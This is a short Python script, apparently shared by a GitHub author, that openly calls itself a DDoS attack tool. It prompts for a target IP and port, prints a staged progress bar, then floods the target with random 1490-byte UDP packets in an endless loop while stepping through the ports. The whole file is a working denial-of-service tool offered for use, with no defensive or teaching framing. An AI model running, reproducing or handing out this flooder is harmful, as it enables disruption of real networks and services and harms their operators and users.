import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("Author   : AmitDas4321")
print("github   : https://github.com/AmitDas4321")
print()

# Prompt the user for the target IP and port
try:
    ip = input("IP Target : ")
    port = int(input("Port       : "))
except ValueError:
    print("Invalid input. Please enter a valid IP and port number.")
    sys.exit(1)

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

sent = 0
while True:
    try:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packet to {ip} throught port:{port}")
        if port == 65534:
            port = 1
    except KeyboardInterrupt:
        print("Attack interrupted by the user.")
        sys.exit(0)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)
